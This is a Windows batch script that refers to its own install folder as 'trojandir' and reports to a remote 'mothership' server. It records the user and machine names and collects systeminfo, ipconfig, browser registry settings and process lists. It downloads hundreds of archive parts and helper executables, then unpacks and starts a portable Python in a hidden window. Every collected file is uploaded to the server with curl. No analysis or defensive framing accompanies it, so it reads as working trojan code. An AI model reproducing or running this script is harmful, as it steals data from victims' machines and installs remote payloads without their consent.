REM set by retrieve.php / mothership
REM SET jobcode=
REM SET mothership=
REM SET mothershipassets=

set /a error_code=0

set sessionid=99%random%%random%%random%%random%%random%
set sessionid=%sessionid:~0,8%
set batchid=%sessionid%

set clientid=xxxxxxxx

SET "trojandir=C:\ProgramData\owd"

IF NOT EXIST %trojandir% (
    goto :error_owd_folder_missing
)

cd /d %trojandir%

IF EXIST %trojandir%\client_id (
    set /p clientid=<%trojandir%\client_id
)

set clientid=%clientid:~0,8%

IF "%clientid%"=="xxxxxxxx" (
    goto :error_not_able_to_extract_clientid
)

echo %USERNAME% > %trojandir%\username
SET /P tusername=<%trojandir%\username

set "tusername=%tusername: =%"

IF "%tusername%"=="" (
    wmic computersystem get username | findstr /v UserName > %trojandir%\username
    set /p tusername=<%trojandir%\username
    set "tusername=%tusername:*\=%"
)

echo %COMPUTERNAME% > %trojandir%\machinename
SET /P machinename=<%trojandir%\machinename

set "machinename=%machinename: =%"

IF "%machinename%"=="" (
    wmic computersystem get name | findstr /v Name > %trojandir%\machinename
    SET /P machinename=<%trojandir%\machinename
)

set "machinename=%machinename: =%"

IF "%machinename%"=="" (

    FOR /F "tokens=2 delims=:" %%A IN ('systeminfo ^| findstr /B /C:"Host Name"') DO (
        set "myHost=%%A"
    )
    set "myHost=%myHost:~1%"

    set machinename=%myHost%
    
    echo %machinename% > %trojandir%\machinename
)

set params=
set params=%params% --data-urlencode "event=start_job" 
set params=%params% --data-urlencode "source=%source%" 
set params=%params% --data-urlencode "sessionid=%sessionid%" 
set params=%params% --data-urlencode "jobcode=%jobcode%" 
set params=%params% --data-urlencode "batchid=%batchid%" 
set params=%params% --data-urlencode "machinename=%machinename%" 
set params=%params% --data-urlencode "username=%tusername%"

curl -G %mothership%/ow/logmsg.php %params%


REM 20260321184244.052000-240
REM %RANDOM% -- 4 digits
set tt=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%
SET "timestamp=%tt:~0,14%%tt:~15,4%"
        
md %trojandir%\cmdlist_%timestamp%

cd /d %trojandir%\cmdlist_%timestamp%
    
set workdir=%trojandir%\cmdlist_%timestamp%

set logfname=cmdlist_%timestamp%.log
SET "logfpath=%workdir%\%logfname%"

REM ----------

set msg=setup done
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM ------ download + install python

set "pythondir=%trojandir%\python"
set "gsdpath=%pythondir%\gsd_files"

IF NOT EXIST %pythondir% (
    mkdir %pythondir%
    mkdir %pythondir%\work

)

IF NOT EXIST %gsdpath% (
    mkdir %gsdpath%
)

cd /d %gsdpath%

FOR /L %%i IN (1,1,735) DO (

    IF NOT EXIST %gsdpath%\disk%%i.gsd (
        curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=downloading disk%%i.gsd" %params%

        curl -o %gsdpath%\disk%%i.gsd -G %mothershipassets%/gsd_files/disk%%i.gsd
    )
)

FOR /L %%i IN (1,1,735) DO (

    IF NOT EXIST %gsdpath%\disk%%i.gsd (
        curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=disk%%i.gsd not present" %params%
        goto :error_failed_gsd_download
    )
)

REM ----------

set msg=installing python -- step 1 unite part files
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM ----------

IF NOT EXIST %gsdpath%\gunite.exe (
    curl -o %gsdpath%\gunite.exe -G %mothershipassets%/gunite.exe
)

IF NOT EXIST %pythondir%\7za.exe (
    curl -o %pythondir%\7za.exe -G %mothershipassets%/7za.exe
)

set filename=wmic_process_gunite.csv
wmic process get commandline, processid /value /format:csv > %workdir%\%filename%

type %workdir%\%filename% | findstr "gunite.exe"

IF NOT "%ERRORLEVEL%"=="0" (
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=gunite.exe is not running -- starting it up" %params%

    IF NOT EXIST %gsdpath%\portable_python.zip (
        curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=running gunite.exe" %params%

        cd /d %gsdpath%
        %gsdpath%\gunite.exe %gsdpath%\disk1.gsd -u %gsdpath%\portable_python.zip -s > %workdir%\gunite.log 2>&1
        
        IF EXIST %gsdpath%\portable_python.zip (
            copy /Y %gsdpath%\portable_python.zip %pythondir%
        )
        
    ) ELSE (
        curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=portable_python.zip exists" %params%
    )
) ELSE (
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=gunite.exe is running" %params%
)

REM ----------

set msg=installing python -- step 2 unzip python
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

REM ----------

set filename=wmic_process_7za.csv
wmic process get commandline, processid /value /format:csv > %workdir%\%filename%

type %workdir%\%filename% | findstr "7za.exe"

IF NOT "%ERRORLEVEL%"=="0" (
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=7za.exe is not running -- starting it up" %params%

    IF EXIST %pythondir%\portable_python.zip (
        curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=running 7za.exe" %params%

        cd /d %pythondir%
        start "" /min /b %pythondir%\7za.exe x %pythondir%\portable_python.zip -o"%pythondir%\work" -aoa -y  > %workdir%\7za.log 2>&1
    )
) ELSE (
    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=7za.exe is running" %params%
)

REM --- system overview

wmic OS GET LocalDateTime | findstr /v "^$" | findstr /v "LocalDateTime" > %workdir%\wmic_check.txt
systeminfo > %workdir%\systeminfo.txt
ipconfig /all > %workdir%\ipconfig.txt

set "key=HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
set "val=ProgId"
reg query "%key%" /v "%val%" > %workdir%\reg_query_browser.txt 2>&1

REM --- final snapshot

dir /s %trojandir% > %workdir%\dir_recurs_final.txt
wmic process get commandline, processid /value /format:csv > %workdir%\wmic_process_final.csv
tasklist /v /fo csv > %workdir%\task_list_final.txt

REM --- upload artifacts

set msg=starting uploadfiles
curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=%msg%" %params%

cd /d %workdir%

SETLOCAL ENABLEDELAYEDEXPANSION

FOR %%F IN ("*") DO (
    set msg=uploading %%F

    curl -G %mothership%/ow/logmsg.php --data-urlencode "msg=!msg!" %params%

    curl -X POST --data-binary "@%%F" %mothership%/ow/upload.php?batchid=%batchid%^&filename=%%F^&clientid=%clientid%^&source=%source%^&sessionid=%sessionid%

)

ENDLOCAL

REM ---

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished" %params%

exit

:error_RunHiddenPSx_missing
set /a error_code+=1
:error_RunHiddenPSx_missing
set /a error_code+=1
:error_full_screen_capture_missing
set /a error_code+=1
:error_full_screen_capture_empty
set /a error_code+=1
:error_retrieve_get_macaddr_failed
set /a error_code+=1
:error_upgrade_download_failed
set /a error_code+=1
:error_not_able_to_extract_clientid
set /a error_code+=1
:error_not_able_to_extract_sessionid
set /a error_code+=1
:error_owd_folder_missing
set /a error_code+=1

curl -G %mothership%/ow/logmsg.php --data-urlencode "event=job_finished_with_error" --data-urlencode "errorcode=%error_code%" %params%

exit
